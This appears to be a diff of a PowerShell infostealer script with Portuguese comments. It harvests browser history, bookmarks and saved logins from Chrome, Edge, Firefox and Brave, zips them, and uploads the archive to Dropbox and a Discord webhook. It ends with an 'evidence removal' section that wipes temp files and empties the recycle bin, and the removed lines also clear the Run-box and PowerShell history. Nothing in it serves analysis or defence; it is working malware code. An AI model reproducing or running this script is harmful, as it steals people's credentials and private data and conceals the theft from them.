@@ -477,18 +477,18 @@ $drivers
 $output > $env:TEMP\$FolderName/computerData.txt
 
 ############################################################################################################################################################
+# Informações dos broswers
 function Get-BrowserData {
-
     [CmdletBinding()]
-    param (	
-        [Parameter (Position=1,Mandatory = $True)]
+    param (    
+        [Parameter(Position=1, Mandatory = $True)]
         [string]$Browser,    
-        [Parameter (Position=1,Mandatory = $True)]
+        [Parameter(Position=2, Mandatory = $True)]
         [string]$DataType 
     ) 
-
+    
     $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
-
+    
     if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
     elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
     elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data\Default\History"}
@@ -497,7 +497,7 @@ function Get-BrowserData {
     elseif ($Browser -eq 'firefox' -and $DataType -eq 'logins'    )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release-*\logins.json"}
     elseif ($Browser -eq 'brave'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"}
     elseif ($Browser -eq 'brave'   -and $DataType -eq 'logins'    )  {$Path = "$Env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data"}
-
+    
     $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} | Sort -Unique
     $Value | ForEach-Object {
         $Key = $_
@@ -512,94 +512,74 @@ function Get-BrowserData {
     } 
 }
 
+$FolderName = "BrowserData"
+$ZIP = "BrowserData.rar"
+$db = "sua_chave_de_autorização_dropbox"
+$dc = "seu_webhook_discord"
+
+# Criar pasta temporária
+New-Item -Path $env:TEMP\$FolderName -ItemType Directory -Force | Out-Null
+
+# Obter dados do navegador e redirecionar a saída para o arquivo BrowserData.txt
 Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-
 Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
-
 Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-
 Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
-
 Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-
 Get-BrowserData -Browser "firefox" -DataType "logins" >> $env:TMP\$FolderName\BrowserData.txt
-
 Get-BrowserData -Browser "brave" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-
 Get-BrowserData -Browser "brave" -DataType "logins" >> $env:TMP\$FolderName\BrowserData.txt
 
-############################################################################################################################################################
-
-Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
+# Compactar pasta temporária em um arquivo RAR
+Compress-Archive -Path $env:TMP\$FolderName -DestinationPath $env:TMP\$ZIP -Force
 
 # Upload para a Dropbox
-
 function dropbox {
-$TargetFilePath="/$ZIP"
-$SourceFilePath="$env:TEMP\$ZIP"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $db
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+    $TargetFilePath="/$ZIP"
+    $SourceFilePath="$env:TEMP\$ZIP"
+    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+    $authorization = "Bearer " + $db
+    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+    $headers.Add("Authorization", $authorization)
+    $headers.Add("Dropbox-API-Arg", $arg)
+    $headers.Add("Content-Type", 'application/octet-stream')
+    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
 
 if (-not ([string]::IsNullOrEmpty($db))){dropbox}
 
-############################################################################################################################################################
-
-#Upload para o Discord
+# Upload para o Discord
 function Upload-Discord {
+    [CmdletBinding()]
+    param (
+        [parameter(Position=0,Mandatory=$False)]
+        [string]$file,
+        [parameter(Position=1,Mandatory=$False)]
+        [string]$text 
+    )
 
-[CmdletBinding()]
-param (
-    [parameter(Position=0,Mandatory=$False)]
-    [string]$file,
-    [parameter(Position=1,Mandatory=$False)]
-    [string]$text 
-)
+    $hookurl = "$dc"
 
-$hookurl = "$dc"
+    $Body = @{
+        'username' = $env:username
+        'content' = $text
+    }
 
-$Body = @{
-  'username' = $env:username
-  'content' = $text
-}
+    if (-not ([string]::IsNullOrEmpty($text))){
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+    }
 
-if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
-
-if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+    if (-not ([string]::IsNullOrEmpty($file))){
+        curl.exe -F "file1=@$file" $hookurl
+    }
 }
 
 if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
 
- 
-
-############################################################################################################################################################
-
-<#
-.NOTES 
-	Agora esta parte é para remover qualquer evidência que prove que o script correu
-#>
-
-# Delete nos ficheiros da pasta Temp
-
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-
-# Delete no histórico do run box 
-
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-
-# Delete no histórico da powershell
-
-Remove-Item (Get-PSreadlineOption).HistorySavePath
-
-# Esvazia a Reciclagem
-
+# Limpar evidências
+Remove-Item $env:TEMP\* -Recurse -Force -ErrorAction SilentlyContinue
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
 
 		
 ############################################################################################################################################################
